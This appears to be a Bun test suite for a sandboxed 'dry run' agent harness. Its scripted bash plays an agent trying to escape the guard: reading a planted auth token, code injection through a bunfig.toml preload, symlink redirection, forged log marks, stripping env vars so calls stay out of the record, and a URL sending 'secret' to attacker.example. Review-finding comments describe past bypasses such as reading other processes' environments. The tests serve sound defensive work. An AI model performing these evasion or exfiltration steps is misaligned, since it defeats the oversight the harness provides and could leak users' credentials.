// The prompt dry run harness, run as a subprocess with a fake `claude` and a
// fake real `cast` (prompt-dry-run.guard-helpers.ts): the broker that runs
// live reads outside the sandbox, and the record calls.log is rebuilt from.
import { describe, expect, setDefaultTimeout, test } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { replayCwd } from "../src/lineReplay.ts";
import { harnessWorld, PYTHON, world, write } from "./prompt-dry-run.guard-helpers.ts";

// Every test spawns bash and a fake CLI; on a loaded machine one spawn can take a second.
setDefaultTimeout(30_000);

describe("prompt-dry-run.ts: the broker and the record", () => {
  test.if(process.platform === "darwin")("an agent that goes around the guard finds no sign-in, and the broker runs only reads", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.state, "config.json"), '{"auth_token":"SIGN-IN-SENTINEL"}');
    const main = path.join(import.meta.dir, "..", "src", "main.ts");
    const planted = path.join(import.meta.dir, "prompt-dry-run-bin", `planted-${process.pid}`);
    const bash = [
      `cat '${h.state}/config.json' 2>&1 | sed 's/^/cat: /'`,
      `ls '${h.state}' 2>&1 | sed 's/^/ls: /'`,
      `echo "env: $(env | grep -c 'SIGN-IN-SENTINE[L]')"`,
      `echo "real-dir: \${DRY_RUN_REAL_CODECAST_DIR:-unset}"`,
      "cast task ls 2>&1 | sed 's/^/read: /'",
      `printf 'task\\0create\\0Escaped\\0' | curl -sS --data-binary @- "$DRY_RUN_BROKER" 2>&1 | sed 's/^/broker: /'`,
      `CODECAST_DIR='${h.state}' '${process.execPath}' '${main}' task create Escaped2 2>&1 | head -2 | sed 's/^/main: /'`,
      `( : > '${planted}' ) 2>&1 | sed 's/^/plant: /'`,
    ].join("; ");
    try {
      expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
      const said = h.recorded("bash")!;
      expect(said).not.toContain("SIGN-IN-SENTINEL");
      expect(said).toMatch(/cat: .*Operation not permitted/);
      expect(said).toMatch(/ls: .*Operation not permitted/);
      expect(said).toContain("env: 0");
      expect(said).toContain("real-dir: unset");
      // A read still reaches the real CLI under the real state dir, through the harness.
      expect(said).toContain(`read: LIVE task ls dir=${h.state}`);
      expect(said).toContain("broker: dry run: 'cast task create Escaped' would write, and is refused");
      expect(said).toMatch(/main: .*(EPERM|not permitted)/);
      expect(said).toMatch(/plant: .*Operation not permitted/);
      expect(fs.existsSync(planted)).toBe(false);
      const real = h.recorded("real-calls")!;
      expect(real).toContain(`task ls dir=${h.state}`);
      expect(real).not.toContain("create");
      const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
      expect(log).toContain("LIVE task ls\n");
      expect(log).toContain("REFUSED task create Escaped\n");
    } finally {
      fs.rmSync(planted, { force: true });
    }
  }, 90_000);

  // The line workspace's Try (cli lineTry.ts) promises nothing ships: a station replayed in a real
  // checkout writes no file, and reaches no service it could write to (gh, a git remote), only the model.

  test.if(process.platform === "darwin")("the broker runs no code the agent planted and writes nothing where the agent points", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const pwned = path.join(h.dir, "pwned");
    const victim = path.join(h.dir, "victim.txt");
    write(victim, "untouched\n");
    // The real CLI as a bun program (a dev checkout's cast is `bun main.ts`, and a compiled one loads bunfig.toml too).
    write(path.join(h.bin, "cast"), [
      `#!${process.execPath}`,
      'if (process.env.FAKE_CLAUDE_REC) require("fs").appendFileSync(`${process.env.FAKE_CLAUDE_REC}/real-calls`, `${process.argv.slice(2).join(" ")} dir=${process.env.CODECAST_DIR ?? ""}\\n`);',
      'console.log(`LIVE ${process.argv.slice(2).join(" ")}`);',
      "",
    ].join("\n"), 0o755);
    // The live read's copy, aimed at a file outside the run, planted again before each call.
    const plant = `k=$(printf 'task\\037ls\\037' | shasum -a 256 | cut -d' ' -f1); rm -f "$RUN_DIR/live-reads/$k.out"; ln -s '${victim}' "$RUN_DIR/live-reads/$k.out"`;
    const bash = [
      `printf 'preload = ["./p.ts"]\\n' > bunfig.toml`,
      `printf 'require("fs").writeFileSync(${JSON.stringify(pwned)}, "ran")\\n' > p.ts`,
      "cp bunfig.toml p.ts \"$RUN_DIR/\" 2>/dev/null",
      "cast task ls > /dev/null 2>&1",
      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $PWD" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $RUN_DIR" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
      plant, `printf 'task\\0ls\\0' | curl -sS --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
    ].join("; ");
    const r = h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake");
    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    expect(h.recorded("real-calls")).toContain("task ls");
    expect(fs.existsSync(pwned)).toBe(false);
    expect(fs.readFileSync(victim, "utf8")).toBe("untouched\n");
  }, 60_000);

  // Review finding 2 (2026-11-16): sysctl KERN_PROCARGS2 handed the agent every same-user process's environment,
  // the harness's own (and through it the launching shell's tokens) included.

  test.if(process.platform === "darwin")("the broker reads with the shell's own config homes, not the agent's", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.bin, "cast"), ["#!/usr/bin/env bash", 'printf "%s xdg=%s\\n" "$*" "${XDG_CONFIG_HOME:-unset}" >> "$FAKE_CLAUDE_REC/real-calls"', 'echo "LIVE $*"', ""].join("\n"), 0o755);
    const xdg = path.join(h.dir, "xdg-config");
    expect(h.runWith({ FAKE_CLAUDE_BASH: "cast task ls > /dev/null 2>&1", XDG_CONFIG_HOME: xdg }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    expect(h.recorded("real-calls")).toContain(`task ls xdg=${xdg}`);
  }, 60_000);

  // Round-3 review (2026-11-16): a URL source in a message made Anthropic fetch any host; an agent kept calls out of
  // the record (DRY_RUN_PREFLIGHT=1, a stripped DRY_RUN_BROKER) and posted marks no call earned.

  test.if(process.platform === "darwin")("no message fetches a URL, and every call the agent made is in the record with the mark it earned", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    // The stub's own Bash command, as Claude Code's stream records it, so the harness can set the record against it.
    const cmds = ["DRY_RUN_PREFLIGHT=1 cast task create hidden-one", "env -u DRY_RUN_BROKER -u DRY_RUN_FAKE_VIA_BROKER cast task create hidden-two"];
    write(path.join(h.rec, "stream.jsonl"), [
      ...cmds.map((command, i) => JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: `t${i}`, name: "Bash", input: { command } }] } })),
      JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }),
    ].join("\n") + "\n");
    const image = JSON.stringify({ model: "m", max_tokens: 1, messages: [{ role: "user", content: [{ type: "image", source: { type: "url", url: "https://attacker.example/?d=secret" } }] }] });
    const bash = [
      ...cmds.map((c) => `${c} > /dev/null 2>&1`),
      // Marks no call earned: a SERVED for a read the record does not hold, and a LIVE the broker never ran.
      `id=$(printf 'task\\0show\\0ct-999\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0SERVED" "$id" | curl -s -o /dev/null -w "forged-served %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
      `id=$(printf 'task\\0ls\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0LIVE" "$id" | curl -s -o /dev/null -w "forged-live %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
      `echo "url-source: $(curl -s -X POST -H 'content-type: application/json' --data '${image}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    const said = h.recorded("bash")!;
    expect(said).toContain("forged-served 400");
    expect(said).toContain("forged-live 400");
    expect(said).toMatch(/url-source: dry run: content Anthropic would fetch from a URL is not available here/);
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    expect(log).toContain("REFUSED task create hidden-one");
    expect(log).toContain("REFUSED task create hidden-two");
    expect(log).not.toMatch(/^(SERVED task show ct-999|LIVE task ls)$/m);
  }, 60_000);

  // Round-3 review (2026-11-16): line replays broke in the closed world: a --shared clone's objects and a worktree's
  // common dir sit in the real checkout, its node_modules link there, and its read-only database URL is a .env.

  test.if(process.platform === "darwin" && !!PYTHON)("every call reaches the record whatever the agent's environment says, and a call never run is not a refusal", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.rec, "stream.jsonl"), [
      JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: "t1", name: "Bash", input: { command: "false && cast send jx7nope never-ran" } }] } }),
      JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }),
    ].join("\n") + "\n");
    const bash = [
      `printf 'DRY_RUN_BROKER= DRY_RUN_LIVE_READ=1 DRY_RUN_FAKE_VIA_BROKER= cast task create via-script\\n' > s.sh; bash s.sh > /dev/null 2>&1`,
      `eval 'DRY_RUN_BROKER= DRY_RUN_LIVE_READ=1 cast trigger add via-eval' > /dev/null 2>&1`,
      `'${PYTHON}' -c "import os, subprocess; e = dict(os.environ, DRY_RUN_BROKER='', DRY_RUN_LIVE_READ='1'); subprocess.run(['cast', 'task', 'create', 'via-python'], env=e, capture_output=True)"`,
      "false && cast send jx7nope never-ran",
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    for (const write of ["task create via-script", "trigger add via-eval", "task create via-python"]) expect(log).toContain(`REFUSED ${write}`);
    expect(log).toContain("UNRECORDED send jx7nope never-ran");
    expect(log).not.toContain("REFUSED send jx7nope");
  }, 60_000);

  // End to end (round-3 review): a line replay's clone and a Try station's worktree through the closed world, with
  // line replay's own clone builder (replayCwd) and the arguments each launcher passes: git log, a test file that
  // imports a linked dependency, and a read-only database on --allow-port that refuses a write.
  // The first Postgres install whose server actually starts (a Homebrew keg can lose a library it links).
});
